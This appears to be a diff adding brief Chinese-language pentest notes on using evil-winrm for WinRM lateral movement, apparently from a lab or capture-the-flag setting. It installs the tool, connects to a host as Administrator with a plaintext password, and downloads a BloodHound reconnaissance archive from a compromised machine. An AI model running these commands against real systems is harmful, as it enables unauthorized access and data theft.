@@ -1,0 +1,10 @@
+这个是专门用来 WinRM 横向移动的
+
+#直接安装为 ruby​​ gem（依赖项将自动安装在您的系统上）
+gem install evil-winrm
+
+#然后就可以直接用了
+evil-winrm  -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!'
+
+#远程下载肉鸡上的文件
+download "C:\Users\svc-alfresco\Desktop\20250416080717_BloodHound.zip" "/home/kali/20250416080717_BloodHound.zip"
